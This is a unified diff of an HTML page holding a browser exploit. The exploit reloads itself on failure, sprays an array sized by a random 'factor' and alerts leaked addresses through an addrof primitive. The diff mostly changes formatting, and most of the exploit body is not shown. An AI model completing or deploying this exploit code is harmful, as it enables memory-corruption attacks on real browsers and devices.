@@ -4,11 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="util.js"></script>
-    <script src="int64.js"></script>
+<script src="int64.js"></script>
     <title>Document</title>
 </head>
 <body>
-    <p id="factors"></p>
+    <p id="factors">
+    </p>
     <p id="status"></p>
     <script>
 
@@ -96,8 +97,7 @@ function trigger(type) {
         success = true;
     }
     if (!success) {
- document.getElementById("factors").innerHTML = "Tried factor: " + factor;
- document.getElementById("status").innerHTML = "Exploit failed.. Trying again!"
+        document.getElementById("status").innerHTML = "Exploit failed.. Trying again!"
         location.reload()
         return;
     }
@@ -118,8 +118,6 @@ function trigger(type) {
         factor = 87 + Math.floor(Math.random() * 1000);
         unknown_device = true;
     }
-
-    
 
     let ref_arr = [];
     for (let i = 0; i < factor; ++i) {
@@ -157,6 +155,7 @@ function trigger(type) {
     alert(addrof({}).toString());
     alert(addrof({}).toString());
 })();
+
     </script>
 </body>
 </html>
